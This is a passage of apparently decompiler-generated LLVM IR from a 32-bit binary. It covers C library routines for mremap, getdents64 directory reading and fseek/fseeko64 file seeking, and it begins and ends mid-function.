  %v2_1c114 = add i32 %v1_1c114, 16
  %v3_1c114 = inttoptr i32 %v2_1c114 to i32*
  store i32 %v5_1c110, i32* %v3_1c114, align 4
  %v0_1c118 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c118 = add i32 %v0_1c118, 10
  %v2_1c118 = inttoptr i32 %v1_1c118 to i8*
  %v3_1c118 = load i8, i8* %v2_1c118, align 1
  %v4_1c118 = zext i8 %v3_1c118 to i32
  store i32 %v4_1c118, i32* %r2.global-to-local, align 4
  %v1_1c11c = add i32 %v0_1c118, 11
  %v2_1c11c = inttoptr i32 %v1_1c11c to i8*
  %v3_1c11c = load i8, i8* %v2_1c11c, align 1
  %v4_1c11c = zext i8 %v3_1c11c to i32
  %v4_1c120 = mul nuw nsw i32 %v4_1c118, 256
  %v5_1c120 = or i32 %v4_1c11c, %v4_1c120
  store i32 %v5_1c120, i32* %r3.global-to-local, align 4
  %v1_1c124 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c124 = add i32 %v1_1c124, 20
  %v3_1c124 = inttoptr i32 %v2_1c124 to i32*
  store i32 %v5_1c120, i32* %v3_1c124, align 4
  %v0_1c128 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c128 = add i32 %v0_1c128, 12
  %v2_1c128 = inttoptr i32 %v1_1c128 to i8*
  %v3_1c128 = load i8, i8* %v2_1c128, align 1
  %v4_1c128 = zext i8 %v3_1c128 to i32
  store i32 %v4_1c128, i32* %r2.global-to-local, align 4
  %v1_1c12c = add i32 %v0_1c128, 13
  %v2_1c12c = inttoptr i32 %v1_1c12c to i8*
  %v3_1c12c = load i8, i8* %v2_1c12c, align 1
  %v4_1c12c = zext i8 %v3_1c12c to i32
  %v4_1c130 = mul nuw nsw i32 %v4_1c128, 256
  %v5_1c130 = or i32 %v4_1c12c, %v4_1c130
  store i32 %v5_1c130, i32* %r3.global-to-local, align 4
  %v1_1c134 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c134 = add i32 %v1_1c134, 24
  %v3_1c134 = inttoptr i32 %v2_1c134 to i32*
  store i32 %v5_1c130, i32* %v3_1c134, align 4
  %v0_1c138 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c138 = add i32 %v0_1c138, 14
  %v2_1c138 = inttoptr i32 %v1_1c138 to i8*
  %v3_1c138 = load i8, i8* %v2_1c138, align 1
  %v4_1c138 = zext i8 %v3_1c138 to i32
  store i32 %v4_1c138, i32* %r2.global-to-local, align 4
  %v1_1c13c = add i32 %v0_1c138, 15
  %v2_1c13c = inttoptr i32 %v1_1c13c to i8*
  %v3_1c13c = load i8, i8* %v2_1c13c, align 1
  %v4_1c13c = zext i8 %v3_1c13c to i32
  %v4_1c140 = mul nuw nsw i32 %v4_1c138, 256
  %v5_1c140 = or i32 %v4_1c13c, %v4_1c140
  store i32 %v5_1c140, i32* %r3.global-to-local, align 4
  %v1_1c144 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c144 = add i32 %v1_1c144, 28
  %v3_1c144 = inttoptr i32 %v2_1c144 to i32*
  store i32 %v5_1c140, i32* %v3_1c144, align 4
  %v0_1c148 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c148 = add i32 %v0_1c148, 20
  %v2_1c148 = inttoptr i32 %v1_1c148 to i32*
  %v3_1c148 = load i32, i32* %v2_1c148, align 4
  store i32 %v3_1c148, i32* %r3.global-to-local, align 4
  %v1_1c14c = add i32 %v0_1c148, 16
  %v2_1c14c = inttoptr i32 %v1_1c14c to i8*
  %v3_1c14c = load i8, i8* %v2_1c14c, align 1
  %v4_1c14c = zext i8 %v3_1c14c to i32
  store i32 %v4_1c14c, i32* %r0.global-to-local, align 4
  %v1_1c150 = add i32 %v0_1c148, 17
  %v2_1c150 = inttoptr i32 %v1_1c150 to i8*
  %v3_1c150 = load i8, i8* %v2_1c150, align 1
  %v4_1c150 = zext i8 %v3_1c150 to i32
  store i32 %v4_1c150, i32* %r1.global-to-local, align 4
  %v1_1c154 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c154 = add i32 %v1_1c154, 44
  %v3_1c154 = inttoptr i32 %v2_1c154 to i32*
  store i32 %v3_1c148, i32* %v3_1c154, align 4
  %v0_1c158 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c158 = add i32 %v0_1c158, 24
  %v2_1c158 = inttoptr i32 %v1_1c158 to i32*
  %v3_1c158 = load i32, i32* %v2_1c158, align 4
  store i32 %v3_1c158, i32* %r3.global-to-local, align 4
  %v1_1c15c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c15c = add i32 %v1_1c15c, 48
  %v3_1c15c = inttoptr i32 %v2_1c15c to i32*
  store i32 %v3_1c158, i32* %v3_1c15c, align 4
  %v0_1c160 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c160 = add i32 %v0_1c160, 28
  %v2_1c160 = inttoptr i32 %v1_1c160 to i32*
  %v3_1c160 = load i32, i32* %v2_1c160, align 4
  store i32 %v3_1c160, i32* %r3.global-to-local, align 4
  %v1_1c164 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c164 = add i32 %v1_1c164, 52
  %v3_1c164 = inttoptr i32 %v2_1c164 to i32*
  store i32 %v3_1c160, i32* %v3_1c164, align 4
  %v0_1c168 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c168 = add i32 %v0_1c168, 32
  %v2_1c168 = inttoptr i32 %v1_1c168 to i32*
  %v3_1c168 = load i32, i32* %v2_1c168, align 4
  store i32 %v3_1c168, i32* %r3.global-to-local, align 4
  %v1_1c16c = add i32 %v0_1c168, 36
  %v2_1c16c = inttoptr i32 %v1_1c16c to i32*
  %v3_1c16c = load i32, i32* %v2_1c16c, align 4
  store i32 %v3_1c16c, i32* %r2.global-to-local, align 4
  %v1_1c170 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c170 = add i32 %v1_1c170, 56
  %v3_1c170 = inttoptr i32 %v2_1c170 to i32*
  store i32 %v3_1c168, i32* %v3_1c170, align 4
  %v0_1c174 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c174 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c174 = add i32 %v1_1c174, 60
  %v3_1c174 = inttoptr i32 %v2_1c174 to i32*
  store i32 %v0_1c174, i32* %v3_1c174, align 4
  %v0_1c178 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c178 = load i32, i32* %r0.global-to-local, align 4
  %v4_1c178 = mul i32 %v1_1c178, 256
  %v5_1c178 = or i32 %v4_1c178, %v0_1c178
  store i32 %v5_1c178, i32* %r1.global-to-local, align 4
  %v0_1c17c = load i32, i32* %r5.global-to-local, align 4
  %v1_1c17c = add i32 %v0_1c17c, 40
  store i32 %v1_1c17c, i32* %r0.global-to-local, align 4
  %v1_1c180 = inttoptr i32 %v1_1c17c to i32*
  %v2_1c180 = load i32, i32* %v1_1c180, align 4
  store i32 %v2_1c180, i32* %r0.global-to-local, align 4
  %v3_1c180 = add i32 %v0_1c17c, 44
  %v4_1c180 = inttoptr i32 %v3_1c180 to i32*
  %v5_1c180 = load i32, i32* %v4_1c180, align 4
  store i32 %v5_1c180, i32* %r2.global-to-local, align 4
  store i32 %v5_1c178, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1c18c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c18c = add i32 %v1_1c18c, 36
  %v3_1c18c = inttoptr i32 %v2_1c18c to i32*
  store i32 %v5_1c178, i32* %v3_1c18c, align 4
  %v0_1c190 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c190 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c190 = add i32 %v1_1c190, 32
  %v3_1c190 = inttoptr i32 %v2_1c190 to i32*
  store i32 %v0_1c190, i32* %v3_1c190, align 4
  %v0_1c194 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c194 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c194 = add i32 %v1_1c194, 36
  %v3_1c194 = inttoptr i32 %v2_1c194 to i32*
  store i32 %v0_1c194, i32* %v3_1c194, align 4
  %v0_1c198 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c198 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c198 = add i32 %v1_1c198, 68
  %v3_1c198 = inttoptr i32 %v2_1c198 to i32*
  store i32 %v0_1c198, i32* %v3_1c198, align 4
  %v1_1c19c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c19c = add i32 %v1_1c19c, 64
  %v3_1c19c = inttoptr i32 %v2_1c19c to i32*
  store i32 %v2_1c180, i32* %v3_1c19c, align 4
  %v0_1c1a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c1a0 = add i32 %v0_1c1a0, 52
  %v2_1c1a0 = inttoptr i32 %v1_1c1a0 to i32*
  %v3_1c1a0 = load i32, i32* %v2_1c1a0, align 4
  store i32 %v3_1c1a0, i32* %r2.global-to-local, align 4
  %v1_1c1a4 = add i32 %v0_1c1a0, 48
  %v2_1c1a4 = inttoptr i32 %v1_1c1a4 to i32*
  %v3_1c1a4 = load i32, i32* %v2_1c1a4, align 4
  store i32 %v3_1c1a4, i32* %r3.global-to-local, align 4
  %v1_1c1a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c1a8 = add i32 %v1_1c1a8, 76
  %v3_1c1a8 = inttoptr i32 %v2_1c1a8 to i32*
  store i32 %v3_1c1a0, i32* %v3_1c1a8, align 4
  %v0_1c1ac = load i32, i32* %r3.global-to-local, align 4
  %v1_1c1ac = load i32, i32* %r6.global-to-local, align 4
  %v2_1c1ac = add i32 %v1_1c1ac, 72
  %v3_1c1ac = inttoptr i32 %v2_1c1ac to i32*
  store i32 %v0_1c1ac, i32* %v3_1c1ac, align 4
  %v2_1c1b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c1b0, i32* %r4.global-to-local, align 4
  ret i32 %v2_1c180

; uselistorder directives
  uselistorder i32 %v5_1c178, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 18, 13, 14, 15, 16, 17, 19 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i32 72, { 5, 0, 1, 2, 3, 8, 6, 7, 4 }
  uselistorder i32 76, { 5, 0, 1, 2, 3, 6, 7, 8, 9, 4 }
  uselistorder i32 68, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 60, { 7, 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 14, { 8, 3, 0, 10, 4, 6, 5, 1, 2, 9, 7 }
  uselistorder i32 13, { 9, 4, 0, 3, 5, 7, 6, 1, 10, 2, 8 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
}

define i32 @mremap() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c1b4 = load i32, i32* @r4, align 4
  store i32 %v3_1c1b4, i32* %stack_var_-8, align 4
  %v0_1c1bc = call i32 @mremap()
  store i32 %v0_1c1bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1c1bc, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_1c1cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_1c1cc, i32* @r4, align 4
  ret i32 %v0_1c1bc

bb3:                                              ; preds = %entry
  %v0_1c1d0 = call i32 @__GI___errno_location()
  %v0_1c1d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c1d4 = sub i32 0, %v0_1c1d4
  %v2_1c1d8 = inttoptr i32 %v0_1c1d0 to i32*
  store i32 %v1_1c1d4, i32* %v2_1c1d8, align 4
  %v2_1c1e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1c1e0, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1c1bc, { 1, 0, 2 }
  uselistorder i32 ()* @mremap, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_1c1e4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_1c1e4, i32* %ip.global-to-local, align 4
  %v3_1c1e8 = load i32, i32* @r4, align 4
  %v6_1c1e8 = load i32, i32* @r5, align 4
  %v1_1c1ec = add i32 %arg3, 6
  %v2_1c1f4 = ptrtoint i32* %stack_var_-60 to i32
  %v1_1c1f8 = and i32 %v1_1c1ec, -4
  %v2_1c1fc = sub i32 %v2_1c1f4, %v1_1c1f8
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v1_1c20c = inttoptr i32 %v2_1c1fc to %linux_dirent64*
  store i32 %v2_1c1fc, i32* %r1.global-to-local, align 4
  %v5_1c210 = call i32 @getdents64(i32 %arg1, %linux_dirent64* %v1_1c20c, i32 %arg3)
  store i32 %v5_1c210, i32* %r4.global-to-local, align 4
  %tmp33 = icmp ult i32 %v5_1c210, -4095
  br i1 %tmp33, label %dec_label_pc_1c234, label %dec_label_pc_1c220

dec_label_pc_1c220:                               ; preds = %entry
  %v0_1c220 = call i32 @__GI___errno_location()
  %v0_1c224 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c224 = sub i32 0, %v0_1c224
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1c22c = inttoptr i32 %v0_1c220 to i32*
  store i32 %v1_1c224, i32* %v2_1c22c, align 4
  %v0_1c23c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c23c

dec_label_pc_1c234:                               ; preds = %entry
  br i1 false, label %dec_label_pc_1c23c, label %dec_label_pc_1c244

dec_label_pc_1c23c:                               ; preds = %dec_label_pc_1c234, %dec_label_pc_1c220
  %v0_1c23c = phi i32 [ -1, %dec_label_pc_1c234 ], [ %v0_1c23c.pre, %dec_label_pc_1c220 ]
  store i32 %v0_1c23c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c338

dec_label_pc_1c244:                               ; preds = %dec_label_pc_1c234
  %v0_1c244 = load i32, i32* @sp, align 4
  %v2_1c244 = add i32 %v0_1c244, %v5_1c210
  store i32 %v2_1c244, i32* %stack_var_-60, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 %v0_1c244, i32* @r5, align 4
  %v0_1c258 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c258 = add i32 %v0_1c258, %arg3
  store i32 %v2_1c258, i32* %sb.global-to-local, align 4
  %v0_1c328.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c31c

dec_label_pc_1c268:                               ; preds = %dec_label_pc_1c31c
  %v2_1c268 = inttoptr i32 %v1_1c324 to i8*
  %v3_1c268 = load i8, i8* %v2_1c268, align 1
  %v4_1c268 = zext i8 %v3_1c268 to i32
  store i32 %v4_1c268, i32* %r2.global-to-local, align 4
  %v1_1c26c = add i32 %v0_1c2cc, 17
  %v2_1c26c = inttoptr i32 %v1_1c26c to i8*
  %v3_1c26c = load i8, i8* %v2_1c26c, align 1
  %v4_1c26c = zext i8 %v3_1c26c to i32
  %v4_1c270 = mul nuw nsw i32 %v4_1c268, 256
  %v5_1c270 = or i32 %v4_1c26c, %v4_1c270
  %v1_1c274 = add nuw nsw i32 %v5_1c270, 3
  %v1_1c278 = and i32 %v1_1c274, 131068
  store i32 %v1_1c278, i32* %r2.global-to-local, align 4
  %v2_1c27c = add i32 %v1_1c278, %v0_1c2d0
  store i32 %v2_1c27c, i32* %sl.global-to-local, align 4
  %v1_1c280 = load i32, i32* %sb.global-to-local, align 4
  %v9_1c280 = icmp eq i32 %v2_1c27c, %v1_1c280
  %v1_1c284 = and i32 %v1_1c274, 128
  %v3_1c28410 = udiv i32 %v1_1c274, 256
  store i32 %v3_1c28410, i32* %ip.global-to-local, align 4
  %v2_1c288 = icmp eq i32 %v1_1c284, 0
  %v3_1c288 = or i1 %v9_1c280, %v2_1c288
  br i1 %v3_1c288, label %dec_label_pc_1c2bc, label %dec_label_pc_1c28c

dec_label_pc_1c28c:                               ; preds = %dec_label_pc_1c268
  store i32 %stack_var_-52.0, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-48.0, i32* %r2.global-to-local, align 4
  %v4_1c29c = call i32 @__GI_lseek64(i32 %arg1, i32 %stack_var_-52.0, i32 %stack_var_-48.0, i32 0)
  %v0_1c2a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c2a0 = load i32, i32* %r8.global-to-local, align 4
  %v9_1c2a0 = icmp eq i32 %v0_1c2a0, %v1_1c2a0
  br i1 %v9_1c2a0, label %dec_label_pc_1c2a8, label %dec_label_pc_1c334

dec_label_pc_1c2a8:                               ; preds = %dec_label_pc_1c28c
  %v0_1c2a8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1c2b4 = inttoptr i32 %v0_1c2a8 to i32*
  store i32 22, i32* %v2_1c2b4, align 4
  %v0_1c338.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c338

dec_label_pc_1c2bc:                               ; preds = %dec_label_pc_1c268
  %v1_1c2bc = add i32 %v0_1c2cc, 8
  %v1_1c2c0 = inttoptr i32 %v1_1c2bc to i32*
  %v2_1c2c0 = load i32, i32* %v1_1c2c0, align 4
  %v3_1c2c0 = add i32 %v0_1c2cc, 12
  %v4_1c2c0 = inttoptr i32 %v3_1c2c0 to i32*
  %v5_1c2c0 = load i32, i32* %v4_1c2c0, align 4
  store i32 %v5_1c2c0, i32* %r4.global-to-local, align 4
  %v1_1c2cc = inttoptr i32 %v0_1c2cc to i32*
  %v2_1c2cc = load i32, i32* %v1_1c2cc, align 4
  %v3_1c2cc = add i32 %v0_1c2cc, 4
  %v4_1c2cc = inttoptr i32 %v3_1c2cc to i32*
  %v5_1c2cc = load i32, i32* %v4_1c2cc, align 4
  store i32 %v5_1c2cc, i32* %r4.global-to-local, align 4
  %v1_1c2d0 = inttoptr i32 %v0_1c2d0 to i32*
  store i32 %v2_1c2cc, i32* %v1_1c2d0, align 4
  %v3_1c2d0 = add i32 %v0_1c2d0, 4
  %v4_1c2d0 = inttoptr i32 %v3_1c2d0 to i32*
  %v5_1c2d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1c2d0, i32* %v4_1c2d0, align 4
  %v0_1c2d4 = load i32, i32* @r5, align 4
  %v1_1c2d4 = add i32 %v0_1c2d4, 8
  %v1_1c2d8 = inttoptr i32 %v1_1c2d4 to i32*
  %v2_1c2d8 = load i32, i32* %v1_1c2d8, align 4
  %v3_1c2d8 = add i32 %v0_1c2d4, 12
  %v4_1c2d8 = inttoptr i32 %v3_1c2d8 to i32*
  %v5_1c2d8 = load i32, i32* %v4_1c2d8, align 4
  store i32 %v5_1c2d8, i32* @r4, align 4
  %v1_1c2dc = load i32, i32* %r6.global-to-local, align 4
  %v2_1c2dc = add i32 %v1_1c2dc, 8
  %v3_1c2dc = inttoptr i32 %v2_1c2dc to i32*
  store i32 %v2_1c2d8, i32* %v3_1c2dc, align 4
  %v0_1c2e0 = load i32, i32* @r4, align 4
  %v1_1c2e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c2e0 = add i32 %v1_1c2e0, 12
  %v3_1c2e0 = inttoptr i32 %v2_1c2e0 to i32*
  store i32 %v0_1c2e0, i32* %v3_1c2e0, align 4
  %v0_1c2e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c2e4 = trunc i32 %v0_1c2e4 to i8
  %v2_1c2e4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1c2e4 = add i32 %v2_1c2e4, 16
  %v4_1c2e4 = inttoptr i32 %v3_1c2e4 to i8*
  store i8 %v1_1c2e4, i8* %v4_1c2e4, align 1
  %v0_1c2e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c2e8 = trunc i32 %v0_1c2e8 to i8
  %v2_1c2e8 = load i32, i32* %r6.global-to-local, align 4
  %v3_1c2e8 = add i32 %v2_1c2e8, 17
  %v4_1c2e8 = inttoptr i32 %v3_1c2e8 to i8*
  store i8 %v1_1c2e8, i8* %v4_1c2e8, align 1
  %v0_1c2ec = load i32, i32* @r5, align 4
  %v1_1c2ec = add i32 %v0_1c2ec, 18
  %v2_1c2ec = inttoptr i32 %v1_1c2ec to i8*
  %v3_1c2ec = load i8, i8* %v2_1c2ec, align 1
  %v2_1c2f0 = load i32, i32* %r6.global-to-local, align 4
  %v3_1c2f0 = add i32 %v2_1c2f0, 18
  %v4_1c2f0 = inttoptr i32 %v3_1c2f0 to i8*
  store i8 %v3_1c2ec, i8* %v4_1c2f0, align 1
  %v0_1c2f4 = load i32, i32* @r5, align 4
  %v1_1c2f4 = add i32 %v0_1c2f4, 16
  %v2_1c2f4 = inttoptr i32 %v1_1c2f4 to i8*
  %v3_1c2f4 = load i8, i8* %v2_1c2f4, align 1
  %v4_1c2f4 = zext i8 %v3_1c2f4 to i32
  %v0_1c2f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c2f8 = add i32 %v0_1c2f8, 1
  %v2_1c2f8 = inttoptr i32 %v1_1c2f8 to i8*
  %v3_1c2f8 = load i8, i8* %v2_1c2f8, align 1
  %v4_1c2f8 = zext i8 %v3_1c2f8 to i32
  %v4_1c2fc = mul nuw nsw i32 %v4_1c2f4, 256
  %v5_1c2fc = or i32 %v4_1c2f8, %v4_1c2fc
  %v1_1c300 = add nsw i32 %v5_1c2fc, -19
  store i32 %v1_1c300, i32* @r2, align 4
  %v0_1c304 = call i32 @memcpy()
  %v0_1c308 = load i32, i32* @r5, align 4
  %v1_1c308 = add i32 %v0_1c308, 16
  %v2_1c308 = inttoptr i32 %v1_1c308 to i8*
  %v3_1c308 = load i8, i8* %v2_1c308, align 1
  %v4_1c308 = zext i8 %v3_1c308 to i32
  store i32 %v4_1c308, i32* %r2.global-to-local, align 4
  %v0_1c30c = load i32, i32* %r7.global-to-local, align 4
  %v1_1c30c = add i32 %v0_1c30c, 1
  %v2_1c30c = inttoptr i32 %v1_1c30c to i8*
  %v3_1c30c = load i8, i8* %v2_1c30c, align 1
  %v4_1c30c = zext i8 %v3_1c30c to i32
  %v4_1c310 = mul nuw nsw i32 %v4_1c308, 256
  %v5_1c310 = or i32 %v4_1c30c, %v4_1c310
  %v2_1c314 = add i32 %v5_1c310, %v0_1c308
  store i32 %v2_1c314, i32* @r5, align 4
  %v0_1c318 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1c318, i32* %r6.global-to-local, align 4
  %v3_1c31c.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_1c31c

dec_label_pc_1c31c:                               ; preds = %dec_label_pc_1c244, %dec_label_pc_1c2bc
  %stack_var_-52.0 = phi i32 [ -1, %dec_label_pc_1c244 ], [ %v2_1c2c0, %dec_label_pc_1c2bc ]
  %v0_1c2d0 = phi i32 [ %v0_1c328.pre, %dec_label_pc_1c244 ], [ %v0_1c318, %dec_label_pc_1c2bc ]
  %v0_1c2cc = phi i32 [ %v0_1c244, %dec_label_pc_1c244 ], [ %v2_1c314, %dec_label_pc_1c2bc ]
  %v3_1c31c = phi i32 [ %v2_1c244, %dec_label_pc_1c244 ], [ %v3_1c31c.pre, %dec_label_pc_1c2bc ]
  %stack_var_-48.0 = phi i32 [ -1, %dec_label_pc_1c244 ], [ %v5_1c2c0, %dec_label_pc_1c2bc ]
  %v3_1c320 = icmp ult i32 %v0_1c2cc, %v3_1c31c
  %v1_1c324 = add i32 %v0_1c2cc, 16
  store i32 %v1_1c324, i32* %r7.global-to-local, align 4
  %v1_1c328 = add i32 %v0_1c2d0, 19
  store i32 %v1_1c328, i32* @r0, align 4
  %v1_1c32c = add i32 %v0_1c2cc, 19
  store i32 %v1_1c32c, i32* @r1, align 4
  br i1 %v3_1c320, label %dec_label_pc_1c268, label %dec_label_pc_1c334.loopexit

dec_label_pc_1c334.loopexit:                      ; preds = %dec_label_pc_1c31c
  %v0_1c334.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c334

dec_label_pc_1c334:                               ; preds = %dec_label_pc_1c334.loopexit, %dec_label_pc_1c28c
  %v1_1c334 = phi i32 [ %v0_1c2d0, %dec_label_pc_1c334.loopexit ], [ %v0_1c2a0, %dec_label_pc_1c28c ]
  %v0_1c334 = phi i32 [ %v0_1c334.pre, %dec_label_pc_1c334.loopexit ], [ %v1_1c2a0, %dec_label_pc_1c28c ]
  %v2_1c334 = sub i32 %v1_1c334, %v0_1c334
  store i32 %v2_1c334, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c338

dec_label_pc_1c338:                               ; preds = %dec_label_pc_1c2a8, %dec_label_pc_1c23c, %dec_label_pc_1c334
  %v0_1c338 = phi i32 [ %v0_1c338.pre, %dec_label_pc_1c2a8 ], [ %v0_1c23c, %dec_label_pc_1c23c ], [ %v2_1c334, %dec_label_pc_1c334 ]
  store i32 %v3_1c1e8, i32* %r4.global-to-local, align 4
  store i32 %v6_1c1e8, i32* @r5, align 4
  ret i32 %v0_1c338

; uselistorder directives
  uselistorder i32 %v1_1c324, { 1, 0 }
  uselistorder i32 %v0_1c2cc, { 6, 5, 7, 0, 3, 4, 1, 2 }
  uselistorder i32 %v0_1c2d0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1c244, { 1, 2, 0 }
  uselistorder i32 %v5_1c210, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 3, 4, 1, 2, 0, 7, 5, 6 }
  uselistorder i32 18, { 4, 5, 2, 3, 0, 1, 6 }
  uselistorder i32 17, { 9, 0, 22, 7, 8, 23, 10, 2, 17, 3, 18, 4, 19, 5, 20, 1, 25, 24, 11, 12, 13, 6, 14, 15, 16, 21 }
  uselistorder i32* @sp, { 8, 25, 26, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 1, 2, 3, 4, 5, 6, 7, 24 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1c338, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c31c, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1c344 = load i32, i32* @r2, align 4
  store i32 %v0_1c344, i32* @r3, align 4
  %v0_1c348 = load i32, i32* @r1, align 4
  %v3_1c34c = ashr i32 %v0_1c348, 31
  store i32 %v3_1c34c, i32* @r1, align 4
  %v0_1c350 = call i32 @__GI_fseeko64()
  ret i32 %v0_1c350
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1c354 = load i32, i32* @r4, align 4
  %v6_1c354 = load i32, i32* @r5, align 4
  %v0_1c358 = load i32, i32* @r3, align 4
  %v2_1c35c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_1c358, i32* %r6.global-to-local, align 4
  %v0_1c364 = load i32, i32* @r1, align 4
  store i32 %v0_1c364, i32* %stack_var_-28, align 4
  %v0_1c36c = load i32, i32* @r0, align 4
  store i32 %v0_1c36c, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1c358, 3
  br i1 %tmp, label %dec_label_pc_1c388, label %dec_label_pc_1c374

dec_label_pc_1c374:                               ; preds = %entry
  %v0_1c374 = call i32 @__GI___errno_location()
  store i32 %v0_1c374, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_1c380 = inttoptr i32 %v0_1c374 to i32*
  store i32 22, i32* %v2_1c380, align 4
  br label %.thread6

dec_label_pc_1c388:                               ; preds = %entry
  %v1_1c388 = add i32 %v0_1c36c, 52
  %v2_1c388 = inttoptr i32 %v1_1c388 to i32*
  %v3_1c388 = load i32, i32* %v2_1c388, align 4
  store i32 %v3_1c388, i32* %r3.global-to-local, align 4
  %v1_1c38c = sub i32 1, %v3_1c388
  store i32 %v1_1c38c, i32* %r7.global-to-local, align 4
  %v2_1c38c = icmp ult i32 %v3_1c388, 2
  br i1 %v2_1c38c, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_1c388
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1c3c8

bb:                                               ; preds = %dec_label_pc_1c388
